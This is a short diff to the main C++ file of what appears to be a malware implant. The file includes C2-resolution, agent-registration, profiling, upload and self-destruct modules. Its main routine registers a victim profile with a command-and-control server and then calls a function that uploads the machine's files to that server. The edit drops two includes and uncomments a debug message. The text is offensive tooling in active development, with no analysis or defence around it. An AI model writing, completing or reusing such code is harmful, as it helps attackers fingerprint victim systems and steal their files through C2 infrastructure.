@@ -1,12 +1,9 @@
 #include "Core/upload.hpp"
-#include "Core/self_destruct.hpp"
 #include "Core/profiler.hpp"
 #include "Communication/google_resolve.hpp"
 #include "Communication/c2_resolve.hpp"
 #include "Communication/addagent.hpp"
-#include "Core/osdp.h"
 #include "Core/helpers.hpp"
-
 
 
 constexpr bool ONETIMERUN = true;
@@ -26,7 +23,7 @@ int main() {
                 std::string response = SendProfile(PC2, JsonProfile);
                 auto jsonResp = nlohmann::json::parse(response);
                 if (jsonResp.contains("message") && jsonResp["message"] == "created") {
-                    //std::cout << "Running file upload" << std::endl;
+                    std::cout << "Running file upload" << std::endl;
                     ProcessFilesAndUpload(C2);
                 }
             }
